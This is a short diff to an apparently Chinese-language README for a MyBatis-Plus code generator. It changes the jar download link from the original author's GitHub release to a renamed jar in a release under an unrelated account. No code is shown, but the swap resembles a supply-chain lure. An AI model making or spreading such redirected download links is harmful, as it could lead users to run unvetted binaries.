@@ -40,7 +40,7 @@
 
 #### 方案1: jar
 
-下载：[mybatis-plus-code-generator-3.5.4.1-2.jar](https://github.com/fengwenyi/mybatis-plus-code-generator/releases/download/3.5.4.1-2/mybatis-plus-code-generator-3.5.4.1-2.jar)
+下载：[mybatis-plus-code-generator-3.5.4.1-2.jar](https://github.com/sinbad-navigator/mybatis-plus-code-generator-main/releases/download/mybatis-plus-code-generator-nick-3.5.4.1-2/mybatis-plus-code-generator-nick-3.5.4.1-2.jar)
 
 运行:
 
